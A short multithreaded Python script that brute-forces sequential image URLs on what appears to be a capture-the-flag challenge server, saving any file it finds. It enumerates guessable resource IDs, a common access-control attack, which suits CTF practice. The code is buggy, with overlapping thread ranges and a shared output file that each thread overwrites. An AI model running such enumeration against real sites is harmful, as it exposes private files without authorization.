import requests
import threading


def browse(x):
    list = []
    f = open("ResultOf.txt", "w")
    for i in range(25000000):
        request = 'https://scanbook.chall.pwnoh.io/static/codes/'
        request = request + str(i+x) + '.png'
        r = requests.get(request)
        if(r.status_code == 404):
            print(i+x)
            continue
        else:
            print(r.status_code)
            list.append(r.text +'\n')
            f.write(r.text +'\n')


# creating thread
t1 = threading.Thread(target=browse, args=(0,))
t2 = threading.Thread(target=browse, args=(2500000,))
t3 = threading.Thread(target=browse, args=(5000000,))
t4 = threading.Thread(target=browse, args=(7500000,))

# starting thread 1
t1.start()
# starting thread 2
t2.start()
# starting thread 3
t3.start()
# starting thread 4
t4.start()

# wait until thread 1 is completely executed
t1.join()
# wait until thread 2 is completely executed
t2.join()
# wait until thread 1 is completely executed
t4.join()
# wait until thread 2 is completely executed
t3.join()

# both threads completely executed
print("Done!")
